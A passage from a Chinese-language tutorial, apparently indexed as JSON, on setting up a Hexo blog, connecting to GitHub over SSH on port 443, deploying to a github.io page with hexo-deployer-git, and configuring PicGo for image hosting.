install就可以。这里只提供笔者遇到的一种错误解决方法，也是在查阅资料后找到的解决方法。\n至此本地博客已经搭建完成。\n1hexo g\n\nhexo g 是 Hexo 静态博客生成器的核心命令，将源代码（Markdown 文章&#x2F;主题&#x2F;配置等）编译成静态网页文件。\n\n1hexo s\n\nhexo s 是 Hexo 静态博客生成器的核心命令，全称为 hexo server。它的主要作用是启动本地服务器用于实时预览博客效果\n\n此时在浏览器输入http://localhost:4000/，可以看到一个简易的个人博客\n\n三、本地博客部署到云服务器在本地博客部署到云服务器之前，需要有一个本地搭建完的博客，一台云服务器，本地安装一个SSH连接工具（或者bash终端）\n1、搭建仓库搭建GitHub存储静态页面的仓库，首先注册&#x2F;登录Github，点击Create repository进入新建仓库页面\n\n仓库名输入：\n1用户名.github.io\n\n勾选 Public ，勾选 Add a README file ，拉到下面点击create创建\n2、生成SSH Keys进入任意文件夹，右键空白处然后点Git bash here，输入\n1ssh-keygen -t rsa -C &quot;邮件地址&quot;\n\n\n进入C:\\Users\\用户名，在里面进入.ssh文件，用记事本打开里面的id_rsa.pub,全选复制里面的代码\n\n然后打开 Github ，进入用户设置，找到 SSH keys 新建SSH keys，名称随意，在下面粘贴代码， 然后创建\n\n测试是否成功，在 Git bash 中输入\n1ssh -T git@github.com\n\n笔者在这一步时遇到了错误\n\n这里表示SSH的22端口可能被防火墙或者网络限制了，笔者给出一种方案，输入命令\n1ssh -T -p 443 git@github.com\n\n\n启用通过HTTPS的SSH连接，笔者在这里能够成功连接，在 SSH 配置文件中设置此设置，请在 ~/.ssh/config 编辑该文件（没有可以直接创建一个config文件，无后缀），并添加以下部分\n1234Host github.comHostname ssh.github.comPort 443User git\n\n最后可以通过再次连接到 GitHub.com 测试此项是否有效\n1ssh -T git@github.com\n\n\n笔者在这里就能够成功连接。\n3、上线博客进入之前的blog文件夹，用记事本打开_config.yml 拉到最下面将deploy后面的全删掉，复制粘贴这段\n123type: gitrepository: branch: main\n\n注意冒号后面有一个空格，每行前面有两个空格。\n进入Github之前生成的仓库页面，点击Code，将下方出现的https链接复制下来，粘贴到repositort: 后面，然后保存并退出。\n回到blog文件夹，打开Git bash，安装自动部署发布工具\n1npm install hexo-deployer-git --save\n\n\n\n\n接下来依次输入\n12hexo g（生成静态文件）hexo d（将静态文件上传到github）\n\n\n\n\n\n接下来我们就成功把本地内容上传到Github了，上传成功以后，我们就算搭建好了！上自己的网址看看吧，网址是我们之前设的仓库名：用户名.github.io\n4、发布文章1hexo new “文章名”\n\n 找到文章路径，修改标题、日期、标签（标签前要加一个空格，否则会报错！）\n12hexo ghexo d\n\n四、PicGo的Github配置1、配置Github新建公开仓库\n\n创建私人令牌token\n\n\n\n然后记下token值\n2、下载PicGo下载地址：https://github.com/Molunerfinn/PicGo/releases\n\n图床设置\n\n具体图床参数配置\n\n","slug":"Hexo个人博客搭建教程","date":"2025-07-28T13:41:52.000Z","categories_index":"","tags_index":"教程","author_index":"wyf"}]